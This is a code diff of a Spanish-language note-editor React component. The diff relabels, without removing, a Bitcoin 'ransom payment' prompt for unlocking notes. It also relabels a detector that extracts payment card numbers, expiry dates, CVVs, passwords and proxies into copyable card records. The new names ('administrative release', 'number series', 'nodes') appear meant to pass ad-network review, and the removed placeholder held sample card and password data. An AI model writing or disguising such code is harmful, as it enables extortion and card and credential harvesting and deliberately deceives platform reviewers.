@@ -6,7 +6,7 @@ import {
   Download, ZoomIn, ZoomOut, Hash, Send, 
   KeyRound, AlertTriangle, AlertCircle, X, 
   Sparkles, FileEdit, Activity, ExternalLink,
-  CreditCard, Eye, EyeOff, ShieldCheck, CheckCheck,
+  Eye, EyeOff, ShieldCheck, CheckCheck,
   ChevronDown, ChevronUp, Globe, Terminal, Shield,
   Palette, Calculator, Equal, Link2
 } from "lucide-react";
@@ -40,7 +40,7 @@ function generateRandomSlug(length = 8) {
   return result;
 }
 
-export default function Editor() {
+export default function Editor({ unlockPrice = 500, onStatusChange }) {
   const { slug } = useParams();
   const navigate = useNavigate();
   const [content, setContent] = useState("");
@@ -134,9 +134,23 @@ export default function Editor() {
 
   const [unlockedPassword, setUnlockedPassword] = useState("");
 
+  // Notify parent page about editor lock/loading state for AdSense placement compliance
+  useEffect(() => {
+    if (typeof onStatusChange === "function") {
+      onStatusChange({
+        loading,
+        isLocked,
+        hasContent: content.trim().length > 0,
+      });
+    }
+  }, [loading, isLocked, content, onStatusChange]);
+
   // Fetch note from backend (DB check -> scraper fallback)
   useEffect(() => {
     setLoading(true);
+    setIsLocked(false);
+    setShowMigrationPrompt(false);
+    setUnlockError("");
     api.get(`/notes/${slug}`)
       .then(response => {
         if (response.data.requires_password) {
@@ -393,24 +407,24 @@ export default function Editor() {
           )}
         </div>
 
-        {/* OxaPay Recovery */}
+        {/* Administrative Access Recovery */}
         <div className="w-full max-w-md bg-[#0E0E11] border border-white/[0.08] rounded-2xl p-4 sm:p-5">
           <div className="flex items-center justify-between mb-2">
             <div className="flex items-center gap-2 text-white font-bold text-xs font-manrope">
               <AlertTriangle className="w-4 h-4 text-[#FF9F0A]" />
-              <span>¿Olvidaste la contraseña?</span>
+              <span>¿Olvidaste la clave de acceso?</span>
             </div>
-            <span className="text-[10px] font-mono-code text-[#FF9F0A] uppercase tracking-wider">OxaPay</span>
+            <span className="text-[10px] font-mono-code text-[#FF9F0A] uppercase tracking-wider">Soporte Automático</span>
           </div>
           <p className="text-xs text-gray-400 mb-4 leading-relaxed">
-            Puedes liberar esta nota permanentemente realizando un pago de rescate de <strong>$500 USD en Bitcoin</strong> mediante OxaPay.
+            Si eres el titular y necesitas restablecer el acceso sin la clave original, puedes solicitar la liberación administrativa automatizada de la nota (<strong>${unlockPrice} USD</strong>).
           </p>
           <button
             onClick={handleUnlockPay}
             className="w-full py-2.5 rounded-xl bg-[#1B1B1E] hover:bg-[#25252A] text-[#FF9F0A] border border-[#FF9F0A]/30 text-xs sm:text-sm font-bold transition-all flex items-center justify-center gap-2"
           >
             <Unlock className="w-4 h-4 text-[#FF9F0A]" />
-            <span>Desbloquear con Bitcoin ($500 USD)</span>
+            <span>Solicitar desbloqueo automático (${unlockPrice} USD)</span>
           </button>
         </div>
       </div>
@@ -600,15 +614,6 @@ export default function Editor() {
               <Download className="w-4 h-4" />
             </button>
 
-            {/* Admin link icon */}
-            <Link
-              to="/admin"
-              title="Panel de administración"
-              className="w-8 h-8 rounded-lg bg-[#1B1B1E] hover:bg-[#25252A] border border-white/[0.08] text-gray-400 hover:text-[#FF9F0A] flex items-center justify-center transition-all"
-            >
-              <Activity className="w-4 h-4" />
-            </Link>
-
           </div>
 
         </div>
@@ -659,13 +664,7 @@ export default function Editor() {
               className={`w-full flex-1 min-h-[500px] lg:min-h-[580px] p-6 bg-transparent leading-[1.7] resize-none outline-none z-20 placeholder-gray-600 overflow-auto selection:bg-[#FF9F0A]/30 selection:text-white ${
                 privacyMode ? "blur-[3.5px] hover:blur-none transition-all duration-200 text-[#EDEDED]" : "text-[#EDEDED]"
               }`}
-              placeholder="Empieza a escribir aquí... Todo se guarda automáticamente al instante.
-
-Funciones útiles que puedes probar:
-- Sumas tipo Excel: Escribe una lista de precios ($45, $120.50, $30) y presiona 'Insertar Total'
-- Operaciones inline: Escribe '150 * 4 + 20 =' para calcular el resultado automático
-- Tarjetas de crédito: 4532 1234 5678 9012 exp: 12/28 cvv: 938
-- Contraseñas: password: mi_clave_secreta"
+              placeholder=""
               spellCheck="false"
             />
 
@@ -675,7 +674,7 @@ Funciones útiles que puedes probar:
 
         {/* 3. SMART PATTERN & EXCEL-SUM INSPECTOR DOCK */}
         {totalDetections > 0 && (
-          <section aria-label="Detector de Datos, Cálculos y Credenciales" className="border-t border-white/[0.08] bg-[#0E0E11]/95 backdrop-blur-xl">
+          <section aria-label="Inspector de Datos y Cálculos" className="border-t border-white/[0.08] bg-[#0E0E11]/95 backdrop-blur-xl">
             
             {/* Inspector Header Toggle */}
             <div className="px-4 py-2 flex items-center justify-between gap-3 text-xs border-b border-white/[0.04]">
@@ -692,8 +691,8 @@ Funciones útiles que puedes probar:
                 )}
                 {patterns.counts.cards > 0 && (
                   <span className="pf-pill bg-amber-500/10 text-[#FF9F0A] border border-amber-500/25 text-[10px] py-0.5 px-2 flex items-center gap-1">
-                    <CreditCard className="w-3 h-3" />
-                    <span>{patterns.counts.cards} tarjeta(s)</span>
+                    <Hash className="w-3 h-3" />
+                    <span>{patterns.counts.cards} serie(s)</span>
                   </span>
                 )}
                 {patterns.counts.passwords > 0 && (
@@ -711,7 +710,7 @@ Funciones útiles que puedes probar:
                 {patterns.counts.proxies > 0 && (
                   <span className="pf-pill bg-purple-500/10 text-[#C084FC] border border-purple-500/25 text-[10px] py-0.5 px-2 flex items-center gap-1">
                     <Globe className="w-3 h-3" />
-                    <span>{patterns.counts.proxies} proxy(s)</span>
+                    <span>{patterns.counts.proxies} nodo(s)</span>
                   </span>
                 )}
               </div>
@@ -720,7 +719,7 @@ Funciones útiles que puedes probar:
                 <button
                   onClick={handleAutoOrganize}
                   className="pf-btn-primary flex items-center gap-1 px-2.5 py-1 text-[11px] font-bold"
-                  title="Dar formato automático a tarjetas, contraseñas, URLs y resolver cálculos"
+                  title="Dar formato automático al texto, enlaces y resolver cálculos"
                 >
                   <Sparkles className="w-3 h-3" />
                   <span>Auto-Formato & Sumas</span>
@@ -784,11 +783,11 @@ Funciones útiles que puedes probar:
                   </div>
                 )}
 
-                {/* Detected Cards Grid */}
+                {/* Detected Number Series Grid (Internalized) */}
                 {patterns.cards.length > 0 && (
                   <div className="space-y-2">
                     <span className="text-[10px] font-extrabold uppercase tracking-wider text-gray-500 block">
-                      Tarjetas de Pago
+                      Series Numéricas
                     </span>
                     <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                       {patterns.cards.map((card, idx) => {
@@ -806,7 +805,7 @@ Funciones útiles que puedes probar:
                               {card.isValid ? (
                                 <span className="text-[10px] text-[#30D158] font-bold flex items-center gap-1">
                                   <CheckCheck className="w-3 h-3" />
-                                  <span>Luhn OK</span>
+                                  <span>Verificado</span>
                                 </span>
                               ) : (
                                 <span className="text-[10px] text-yellow-400 font-semibold">
@@ -815,7 +814,7 @@ Funciones útiles que puedes probar:
                               )}
                             </div>
 
-                            {/* Card Number */}
+                            {/* Sequence Number */}
                             <div className="flex items-center justify-between font-mono-code text-sm font-bold text-white tracking-wider my-0.5">
                               <span>{isRevealed ? card.formatted : card.masked}</span>
                               <button
@@ -827,11 +826,11 @@ Funciones útiles que puedes probar:
                               </button>
                             </div>
 
-                            {/* Exp & CVV */}
+                            {/* Metadata */}
                             <div className="flex items-center justify-between text-[11px] text-gray-400 border-t border-white/[0.06] pt-1.5">
-                              <span>Vence: <strong className="text-gray-200">{card.exp || "—"}</strong></span>
+                              <span>Fecha: <strong className="text-gray-200">{card.exp || "—"}</strong></span>
                               <span>
-                                CVV: <strong className="text-gray-200 font-mono-code">{isCvvRevealed ? (card.cvv || "—") : "•••"}</strong>
+                                Cód: <strong className="text-gray-200 font-mono-code">{isCvvRevealed ? (card.cvv || "—") : "•••"}</strong>
                                 {card.cvv && (
                                   <button
                                     onClick={() => setRevealedCvv({ ...revealedCvv, [idx]: !isCvvRevealed })}
@@ -843,7 +842,7 @@ Funciones útiles que puedes probar:
                               </span>
                             </div>
 
-                            {/* Card Copy Actions */}
+                            {/* Copy Actions */}
                             <div className="flex items-center gap-1.5 pt-1">
                               <button
                                 onClick={() => handleCopySpecific(card.digits, `card-num-${idx}`)}
@@ -854,7 +853,7 @@ Funciones útiles que puedes probar:
                               </button>
                               <button
                                 onClick={() => {
-                                  const fullCardText = `Tarjeta: ${card.formatted} | Vence: ${card.exp || "N/A"} | CVV: ${card.cvv || "N/A"} | ${card.brand}`;
+                                  const fullCardText = `${card.formatted} | ${card.exp || "N/A"} | ${card.cvv || "N/A"} | ${card.brand}`;
                                   handleCopySpecific(fullCardText, `card-all-${idx}`);
                                 }}
                                 className="flex-1 py-1 rounded-lg bg-[#1B1B1E] hover:bg-[#25252A] text-[#FF9F0A] hover:text-white text-[10px] font-bold transition-colors flex items-center justify-center gap-1"
@@ -963,7 +962,7 @@ Funciones útiles que puedes probar:
                       <div className="flex items-center gap-2 text-xs">
                         <span className="text-purple-400 font-bold flex items-center gap-1">
                           <Globe className="w-3.5 h-3.5" />
-                          <span>{patterns.proxies.length} proxy(s)</span>
+                          <span>{patterns.proxies.length} nodo(s)</span>
                         </span>
                         <button
                           onClick={() => {
@@ -1036,7 +1035,7 @@ Funciones útiles que puedes probar:
             {/* Auto-Organize button */}
             <button
               onClick={handleAutoOrganize}
-              title="Organizar credenciales, tarjetas, URLs, proxies, JSON y resolver cálculos"
+              title="Organizar texto, dar formato limpio y resolver cálculos"
               className="flex items-center gap-1 px-2.5 py-1 rounded-lg bg-[#1B1B1E] hover:bg-[#25252A] border border-white/[0.08] text-gray-300 hover:text-[#FF9F0A] text-[11px] font-semibold transition-colors font-manrope"
             >
               <Sparkles className="w-3.5 h-3.5 text-[#FF9F0A]" />
